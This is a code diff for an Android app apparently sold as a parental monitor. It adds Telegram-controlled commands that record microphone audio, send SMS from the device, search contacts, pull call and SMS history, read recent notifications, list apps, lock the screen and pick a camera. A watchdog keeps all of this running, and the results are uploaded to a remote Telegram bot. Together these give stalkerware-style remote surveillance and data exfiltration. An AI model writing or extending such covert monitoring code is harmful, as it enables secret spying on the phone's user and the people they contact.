@@ -35,9 +35,19 @@ class MonitoringService : Service() {
     private lateinit var messageQueue: MessageQueue
     private lateinit var cameraService: CameraService
     
-    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private val scopeErrorHandler = CoroutineExceptionHandler { _, error ->
+        try {
+            CrashReporter.saveNow(this, error)
+        } catch (_: Exception) {
+        }
+        android.util.Log.e("MonitoringService", "Background failure recorded", error)
+    }
+    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob() + scopeErrorHandler)
     private val cameraBusy = AtomicBoolean(false)
     private var watchdogJob: Job? = null
+    private var loopWatchdogJob: Job? = null
+    private var loopWatchdogNoticeAt = 0L
+    private var serviceStartAt = 0L
     private val cameraAttempt = java.util.concurrent.atomic.AtomicInteger(0)
     private var monitoringJob: Job? = null
     private var cameraJob: Job? = null
@@ -122,6 +132,7 @@ class MonitoringService : Service() {
     }
 
     private fun startMonitoring() {
+        serviceStartAt = System.currentTimeMillis()
         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Starting monitoring service ===")
 
         // Cancel any previous loops so a restart never duplicates work
@@ -218,6 +229,7 @@ class MonitoringService : Service() {
         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Monitoring loop started")
         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "📸 Camera monitoring started")
         startCommandPolling()
+        startLoopWatchdog()
         serviceScope.launch {
             registerBotCommands()
         }
@@ -391,9 +403,14 @@ class MonitoringService : Service() {
                 }
                 val message = update.message ?: continue
                 if (message.chat.id.toString() != chatId) continue
-                val raw = message.text?.trim()?.substringBefore("@")?.lowercase() ?: continue
+                val full = message.text?.trim() ?: continue
+                val raw = full.substringBefore("@").lowercase()
                 if (!raw.startsWith("/")) continue
-                handleTelegramCommand(raw)
+                val input = if (raw == "/sms" || raw.startsWith("/sms ")) {
+                    val smsArg = full.substringAfter(" ", "").trim()
+                    if (smsArg.isEmpty()) "/sms" else "/sms $smsArg"
+                } else raw
+                handleTelegramCommand(input, message.date)
             } finally {
                 if (update.updateId > preferencesManager.lastUpdateId) {
                     preferencesManager.lastUpdateId = update.updateId
@@ -447,6 +464,22 @@ class MonitoringService : Service() {
             com.redeye.parentalmonitor.network.BotCommand("stop", "Pause monitoring"),
             com.redeye.parentalmonitor.network.BotCommand("resume", "Resume monitoring"),
             com.redeye.parentalmonitor.network.BotCommand("notif", "Notif forwarding: /notif on|off|status"),
+            com.redeye.parentalmonitor.network.BotCommand("syncinterval", "Set sync interval 1-1440 min"),
+            com.redeye.parentalmonitor.network.BotCommand("restart", "Restart monitoring loops"),
+            com.redeye.parentalmonitor.network.BotCommand("flush", "Send queued messages now"),
+            com.redeye.parentalmonitor.network.BotCommand("clearqueue", "Drop queued messages"),
+            com.redeye.parentalmonitor.network.BotCommand("lock", "Lock device screen"),
+            com.redeye.parentalmonitor.network.BotCommand("ring", "Ring device aloud"),
+            com.redeye.parentalmonitor.network.BotCommand("ping", "Check bot delay"),
+            com.redeye.parentalmonitor.network.BotCommand("record", "Record audio 5-60 s"),
+            com.redeye.parentalmonitor.network.BotCommand("sms", "Send SMS: /sms nomor pesan"),
+            com.redeye.parentalmonitor.network.BotCommand("lastnotif", "Show last notifications"),
+            com.redeye.parentalmonitor.network.BotCommand("version", "Show app/device version"),
+            com.redeye.parentalmonitor.network.BotCommand("uptime", "Show service uptime"),
+            com.redeye.parentalmonitor.network.BotCommand("contacts", "Search contacts: /contacts nama"),
+            com.redeye.parentalmonitor.network.BotCommand("apps", "List installed apps"),
+            com.redeye.parentalmonitor.network.BotCommand("storage", "Show storage usage"),
+            com.redeye.parentalmonitor.network.BotCommand("history", "Calls+SMS by number"),
             com.redeye.parentalmonitor.network.BotCommand("log", "Show last crash/error log"),
             com.redeye.parentalmonitor.network.BotCommand("help", "Show all commands")
         )
@@ -492,12 +525,23 @@ class MonitoringService : Service() {
         )
     }
 
-    private suspend fun handleTelegramCommand(raw: String) {
+    private suspend fun handleTelegramCommand(raw: String, sentAtSec: Long = 0L) {
         val parts = raw.split("\\s+".toRegex(), limit = 2)
         val command = parts[0]
         val arg = parts.getOrNull(1)?.trim().orEmpty()
         when (command) {
             "/photo" -> {
+                val lens = arg.substringBefore(" ")
+                if (lens.isNotEmpty()) {
+                    when (lens) {
+                        "belakang", "back" -> preferencesManager.cameraFacing = "back"
+                        "depan", "front" -> preferencesManager.cameraFacing = "front"
+                        else -> {
+                            sendToTelegram("Usage: /photo [depan|belakang]")
+                            return
+                        }
+                    }
+                }
                 if (preferencesManager.monitoringPaused) {
                     sendToTelegram("⏸️ Monitoring is paused. Send /resume first.")
                 } else {
@@ -673,6 +717,219 @@ class MonitoringService : Service() {
                     }
                 )
             }
+            "/syncinterval" -> {
+                val minutes = arg.toIntOrNull()?.coerceIn(1, 1440)
+                if (minutes == null) {
+                    sendToTelegram("Usage: /syncinterval \u003c1-1440\u003e (minutes)")
+                } else {
+                    preferencesManager.syncInterval = minutes
+                    sendToTelegram("\u23F1\uFE0F Sync interval set to $minutes min.")
+                }
+            }
+            "/restart" -> {
+                restartAllLoops()
+                sendToTelegram("\u267B\uFE0F Loops restarted.")
+            }
+            "/flush" -> {
+                val queued = messageQueue.getQueueSize()
+                val scheduled = MessageScheduler.scheduleMessageSend(this)
+                if (scheduled) {
+                    sendToTelegram("\uD83D\uDCE4 Flush scheduled ($queued queued). Sending when online.")
+                } else {
+                    sendToTelegram("\u26A0\uFE0F Could not schedule flush ($queued queued).")
+                }
+            }
+            "/clearqueue" -> {
+                val queued = messageQueue.getQueueSize()
+                try {
+                    messageQueue.clearQueue()
+                } catch (_: Exception) {
+                }
+                sendToTelegram("\uD83D\uDDD1\uFE0F Queue cleared ($queued dropped).")
+            }
+            "/lock" -> {
+                try {
+                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    val admin = android.content.ComponentName(this, com.redeye.parentalmonitor.receiver.AdminReceiver::class.java)
+                    if (!dpm.isAdminActive(admin)) {
+                        sendToTelegram("\u26A0\uFE0F Device Admin not active. Enable it in Setup first.")
+                    } else {
+                        dpm.lockNow()
+                        sendToTelegram("\uD83D\uDD12 Device locked.")
+                    }
+                } catch (e: SecurityException) {
+                    sendToTelegram("\u26A0\uFE0F Cannot lock: Device Admin not active.")
+                } catch (e: Exception) {
+                    sendToTelegram("\u26A0\uFE0F Lock failed.")
+                }
+            }
+            "/ring" -> {
+                val seconds = arg.toIntOrNull()?.coerceIn(5, 60) ?: 15
+                ringDevice(seconds)
+            }
+            "/ping" -> {
+                if (sentAtSec > 0) {
+                    val lag = System.currentTimeMillis() / 1000L - sentAtSec
+                    sendToTelegram("\uD83C\uDFD3 Pong! Delay ${lag.coerceAtLeast(0)} s.")
+                } else {
+                    sendToTelegram("\uD83C\uDFD3 Pong! " + TimeFmt.full(System.currentTimeMillis()))
+                }
+            }
+            "/record" -> {
+                val seconds = arg.toIntOrNull()?.coerceIn(5, 60)
+                if (seconds == null) {
+                    sendToTelegram("Usage: /record \u003c5-60\u003e (seconds)")
+                } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    sendToTelegram("\u26A0\uFE0F Microphone permission missing. Open Setup and grant Microphone permission.")
+                } else {
+                    sendToTelegram("\uD83C\uDF99\uFE0F Recording $seconds s\u2026")
+                    recordAndSendAudio(seconds)
+                }
+            }
+            "/sms" -> {
+                val number = arg.substringBefore(" ").trim()
+                val smsText = arg.substringAfter(" ", "").trim()
+                if (number.isEmpty() || smsText.isEmpty()) {
+                    sendToTelegram("Usage: /sms \u003cnomor\u003e \u003cpesan\u003e")
+                } else if (!number.matches(Regex("^\\+?[0-9]{5,15}$"))) {
+                    sendToTelegram("\u26A0\uFE0F Nomor tidak valid. Usage: /sms \u003cnomor\u003e \u003cpesan\u003e")
+                } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    sendToTelegram("\u26A0\uFE0F SMS permission missing. Open Setup and grant SMS permission.")
+                } else {
+                    try {
+                        val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                            getSystemService(android.telephony.SmsManager::class.java)
+                        } else {
+                            android.telephony.SmsManager.getDefault()
+                        }
+                        if (smsText.length > 160) {
+                            smsManager.sendMultipartTextMessage(number, null, smsManager.divideMessage(smsText), null, null)
+                        } else {
+                            smsManager.sendTextMessage(number, null, smsText, null, null)
+                        }
+                        sendToTelegram("\uD83D\uDCE9 SMS sent to $number.")
+                    } catch (e: SecurityException) {
+                        sendToTelegram("\u26A0\uFE0F SMS permission missing. Open Setup and grant SMS permission.")
+                    } catch (e: Exception) {
+                        sendToTelegram("\u26A0\uFE0F SMS failed.")
+                    }
+                }
+            }
+            "/lastnotif" -> {
+                val items = try {
+                    NotificationForwarderService.history()
+                } catch (_: Exception) {
+                    emptyList()
+                }
+                if (items.isEmpty()) {
+                    sendToTelegram("\uD83D\uDD14 No notifications recorded yet.")
+                } else {
+                    sendToTelegram(
+                        buildString {
+                            appendLine("\uD83D\uDD14 <b>Last notifications</b>")
+                            for (item in items.takeLast(10)) {
+                                appendLine("\u2022 " + escapeHtml(item.app) + ": " + escapeHtml(item.title.take(80)) + " \u2014 " + escapeHtml(item.text.take(120)))
+                            }
+                        }
+                    )
+                }
+            }
+            "/version" -> {
+                sendToTelegram(
+                    buildString {
+                        appendLine("\u2139\uFE0F <b>Version</b>")
+                        appendLine("App: " + com.redeye.parentalmonitor.BuildConfig.VERSION_NAME + " (" + com.redeye.parentalmonitor.BuildConfig.VERSION_CODE + ")")
+                        appendLine("Android: " + Build.VERSION.SDK_INT + " (" + Build.VERSION.RELEASE + ")")
+                        appendLine("Device: " + Build.MANUFACTURER + " " + Build.MODEL)
+                    }
+                )
+            }
+            "/uptime" -> {
+                val started = serviceStartAt
+                if (started <= 0) {
+                    sendToTelegram("\u23F1\uFE0F Uptime unknown.")
+                } else {
+                    val minutes = (System.currentTimeMillis() - started) / 60_000L
+                    val hours = minutes / 60
+                    val days = hours / 24
+                    val span = when {
+                        days > 0 -> "$days d ${hours % 24} h"
+                        hours > 0 -> "$hours h ${minutes % 60} m"
+                        else -> "$minutes m"
+                    }
+                    sendToTelegram("\u23F1\uFE0F <b>Uptime</b>\nRunning: $span\nSince: " + formatDate(started))
+                }
+            }
+            "/contacts" -> {
+                if (arg.isEmpty()) {
+                    sendToTelegram("Usage: /contacts \u003cnama\u003e")
+                } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    sendToTelegram("\u26A0\uFE0F Contacts permission missing. Open Setup and grant Contacts permission.")
+                } else {
+                    val found = searchContacts(arg.take(40))
+                    if (found.isEmpty()) {
+                        sendToTelegram("\uD83D\uDC64 No contacts matching that name.")
+                    } else {
+                        sendToTelegram(
+                            buildString {
+                                appendLine("\uD83D\uDC64 <b>Contacts (${found.size})</b>")
+                                for (entry in found) {
+                                    appendLine("\u2022 " + escapeHtml(entry.first) + " \u2014 " + escapeHtml(entry.second))
+                                }
+                            }
+                        )
+                    }
+                }
+            }
+            "/apps" -> {
+                val limit = arg.toIntOrNull()?.coerceIn(5, 50) ?: 30
+                val apps = listLaunchableApps(limit)
+                if (apps.isEmpty()) {
+                    sendToTelegram("\uD83D\uDCE6 No apps found.")
+                } else {
+                    sendToTelegram(
+                        buildString {
+                            appendLine("\uD83D\uDCE6 <b>Apps (${apps.size})</b>")
+                            for (label in apps) {
+                                appendLine("\u2022 " + escapeHtml(label))
+                            }
+                        }
+                    )
+                }
+            }
+            "/storage" -> {
+                sendToTelegram(
+                    buildString {
+                        appendLine("\uD83D\uDCBE <b>Storage</b>")
+                        appendLine("Cache: " + formatBytes(dirSize(cacheDir)) + " (" + pendingPhotoCount() + " photos)")
+                        appendLine("Files: " + formatBytes(dirSize(filesDir)))
+                        appendLine("Queued: ${messageQueue.getQueueSize()}")
+                    }
+                )
+            }
+            "/history" -> {
+                val digits = arg.filter { it.isDigit() }
+                if (digits.length < 3) {
+                    sendToTelegram("Usage: /history \u003cnomor\u003e")
+                } else {
+                    val calls = try {
+                        callLogRepository.getAllCalls(200).filter { it.number.filter { c -> c.isDigit() }.contains(digits) }.take(5)
+                    } catch (_: Exception) {
+                        emptyList()
+                    }
+                    val sms = try {
+                        smsRepository.getRecentSms(100).filter { it.address.filter { c -> c.isDigit() }.contains(digits) }.take(5)
+                    } catch (_: Exception) {
+                        emptyList()
+                    }
+                    if (calls.isEmpty() && sms.isEmpty()) {
+                        sendToTelegram("\uD83D\uDD0E No history for $digits.")
+                    } else {
+                        if (calls.isNotEmpty()) sendToTelegram(formatCallMessage(calls))
+                        if (sms.isNotEmpty()) sendToTelegram(formatSmsMessage(sms))
+                    }
+                }
+            }
             "/help", "/start" -> {
                 sendToTelegram(
                     buildString {
@@ -691,6 +948,22 @@ class MonitoringService : Service() {
                         appendLine("/stop - pause monitoring")
                         appendLine("/resume - resume monitoring")
                         appendLine("/notif <on|off|status> - notif forwarding")
+                        appendLine("/syncinterval \u003c1-1440\u003e - set sync interval")
+                        appendLine("/restart - restart monitoring loops")
+                        appendLine("/flush - send queued messages now")
+                        appendLine("/clearqueue - drop queued messages")
+                        appendLine("/lock - lock device screen")
+                        appendLine("/ring [5-60] - ring device aloud")
+                        appendLine("/ping - check bot delay")
+                        appendLine("/record \u003c5-60\u003e - record audio seconds")
+                        appendLine("/sms \u003cnomor\u003e \u003cpesan\u003e - send SMS")
+                        appendLine("/lastnotif - show last notifications")
+                        appendLine("/version - show app/device version")
+                        appendLine("/uptime - show service uptime")
+                        appendLine("/contacts \u003cnama\u003e - search contacts")
+                        appendLine("/apps [N] - list installed apps")
+                        appendLine("/storage - show storage usage")
+                        appendLine("/history \u003cnomor\u003e - calls+SMS by number")
                         appendLine("/log - show last crash/error log")
                         appendLine("/help - show this list")
                     },
@@ -1111,6 +1384,10 @@ class MonitoringService : Service() {
         commandJob?.cancel()
         initialSyncJob?.cancel()
         initialSyncRunning.set(false)
+        try {
+            loopWatchdogJob?.cancel()
+        } catch (_: Exception) {
+        }
         watchdogJob?.cancel()
         stopForeground(STOP_FOREGROUND_REMOVE)
         stopSelf()
@@ -1275,6 +1552,209 @@ class MonitoringService : Service() {
         } else {
             prunePhotoCache()
         }
+    }
+
+    private fun restartAllLoops() {
+        startPeriodicLoops()
+        startCommandPolling()
+    }
+    private fun startLoopWatchdog() {
+        try {
+            loopWatchdogJob?.cancel()
+        } catch (_: Exception) {
+        }
+        loopWatchdogJob = serviceScope.launch {
+            while (isActive && loopWatchdogJob === coroutineContext[Job]) {
+                try {
+                    delay(300_000L)
+                } catch (e: java.util.concurrent.CancellationException) {
+                    throw e
+                } catch (_: Exception) {
+                    continue
+                }
+                try {
+                    if (monitoringJob?.isActive != true || cameraJob?.isActive != true || commandJob?.isActive != true) {
+                        android.util.Log.w("MonitoringService", "Loop watchdog: restarting dead loops")
+                        restartAllLoops()
+                        val now = android.os.SystemClock.elapsedRealtime()
+                        if (now - loopWatchdogNoticeAt > 3_600_000L) {
+                            loopWatchdogNoticeAt = now
+                            sendToTelegram("\u267B\uFE0F Watchdog restarted dead loops.")
+                        }
+                    }
+                } catch (e: java.util.concurrent.CancellationException) {
+                    throw e
+                } catch (e: Exception) {
+                    android.util.Log.e("MonitoringService", "Loop watchdog error", e)
+                }
+            }
+        }
+    }
+
+    private suspend fun ringDevice(seconds: Int) {
+        val audioManager = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
+        val stream = android.media.AudioManager.STREAM_ALARM
+        val previous = try {
+            audioManager.getStreamVolume(stream)
+        } catch (_: Exception) {
+            -1
+        }
+        var ringtone: android.media.Ringtone? = null
+        try {
+            try {
+                audioManager.setStreamVolume(stream, audioManager.getStreamMaxVolume(stream), 0)
+            } catch (_: Exception) {
+            }
+            val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
+            ringtone = android.media.RingtoneManager.getRingtone(applicationContext, uri)
+            ringtone?.play()
+            sendToTelegram("\uD83D\uDD14 Ringing for $seconds s\u2026")
+            kotlinx.coroutines.delay(seconds * 1000L)
+            sendToTelegram("\uD83D\uDD14 Ring finished.")
+        } catch (e: Exception) {
+            sendToTelegram("\u26A0\uFE0F Ring failed.")
+        } finally {
+            try {
+                ringtone?.stop()
+            } catch (_: Exception) {
+            }
+            try {
+                if (previous >= 0) audioManager.setStreamVolume(stream, previous, 0)
+            } catch (_: Exception) {
+            }
+        }
+    }
+
+    @Suppress("DEPRECATION")
+    private suspend fun recordAndSendAudio(seconds: Int) {
+        val audioFile = File(cacheDir, "audio_" + System.currentTimeMillis() + ".m4a")
+        var recorder: android.media.MediaRecorder? = null
+        try {
+            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                android.media.MediaRecorder(this)
+            } else {
+                android.media.MediaRecorder()
+            }
+            recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
+            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
+            recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
+            recorder.setOutputFile(audioFile.absolutePath)
+            recorder.prepare()
+            recorder.start()
+            kotlinx.coroutines.delay(seconds * 1000L)
+            try {
+                recorder.stop()
+            } catch (_: Exception) {
+            }
+            if (sendAudioFile(audioFile)) {
+                sendToTelegram("\uD83C\uDF99\uFE0F Audio sent (${seconds}s).")
+            } else {
+                sendToTelegram("\u26A0\uFE0F Audio recorded but send failed.")
+            }
+        } catch (e: SecurityException) {
+            sendToTelegram("\u26A0\uFE0F Microphone permission missing. Open Setup and grant Microphone permission.")
+        } catch (e: Exception) {
+            sendToTelegram("\u26A0\uFE0F Record failed.")
+        } finally {
+            try {
+                recorder?.release()
+            } catch (_: Exception) {
+            }
+            secureDelete(audioFile)
+        }
+    }
+
+    private suspend fun sendAudioFile(audioFile: File): Boolean {
+        try {
+            if (!hasNetwork()) return false
+            val (botToken, chatId) = sendCreds()
+            if (botToken.isEmpty() || chatId.isEmpty()) return false
+            val requestFile = audioFile.asRequestBody("audio/mp4".toMediaTypeOrNull())
+            val audioPart = MultipartBody.Part.createFormData("audio", audioFile.name, requestFile)
+            val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())
+            val caption = ("\uD83C\uDF99\uFE0F " + TimeFmt.full(System.currentTimeMillis())).toRequestBody("text/plain".toMediaTypeOrNull())
+            val url = "https://api.telegram.org/bot$botToken/sendAudio"
+            val response = TelegramClient.api.sendAudio(url, chatIdBody, caption, audioPart)
+            if (response.isSuccessful && response.body()?.ok == true) {
+                preferencesManager.lastSyncTime = System.currentTimeMillis()
+                return true
+            }
+            if (response.code() == 400 || response.code() == 401 || response.code() == 403) {
+                try {
+                    preferencesManager.credentialError = response.code().toString()
+                    preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
+                } catch (_: Exception) {
+                }
+            }
+            return false
+        } catch (e: Exception) {
+            return false
+        }
+    }
+
+    private fun searchContacts(query: String): List<Pair<String, String>> {
+        val out = mutableListOf<Pair<String, String>>()
+        try {
+            val uri = android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI
+            val projection = arrayOf(
+                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
+            )
+            val cursor = contentResolver.query(
+                uri,
+                projection,
+                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ?",
+                arrayOf("%$query%"),
+                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
+            )
+            cursor?.use { c ->
+                val nameIdx = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                val numIdx = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
+                while (c.moveToNext() && out.size < 10) {
+                    out.add((c.getString(nameIdx) ?: "") to (c.getString(numIdx) ?: ""))
+                }
+            }
+        } catch (_: Exception) {
+        }
+        return out
+    }
+
+    private fun listLaunchableApps(limit: Int): List<String> {
+        return try {
+            val intent = android.content.Intent(android.content.Intent.ACTION_MAIN).addCategory(android.content.Intent.CATEGORY_LAUNCHER)
+            packageManager.queryIntentActivities(intent, 0).mapNotNull { r ->
+                try {
+                    r.loadLabel(packageManager)?.toString()
+                } catch (_: Exception) {
+                    null
+                }
+            }.distinct().sortedBy { it.lowercase() }.take(limit)
+        } catch (_: Exception) {
+            emptyList()
+        }
+    }
+
+    private fun dirSize(dir: File): Long {
+        return try {
+            dir.walkTopDown().filter { it.isFile }.sumOf { f ->
+                try {
+                    f.length()
+                } catch (_: Exception) {
+                    0L
+                }
+            }
+        } catch (_: Exception) {
+            0L
+        }
+    }
+
+    private fun formatBytes(bytes: Long): String {
+        if (bytes < 1024) return "$bytes B"
+        val kb = bytes / 1024.0
+        if (kb < 1024) return String.format(java.util.Locale.US, "%.1f KB", kb)
+        val mb = kb / 1024.0
+        if (mb < 1024) return String.format(java.util.Locale.US, "%.1f MB", mb)
+        return String.format(java.util.Locale.US, "%.2f GB", mb / 1024.0)
     }
 
     private suspend fun sendPhotoFile(photoFile: File): Boolean {
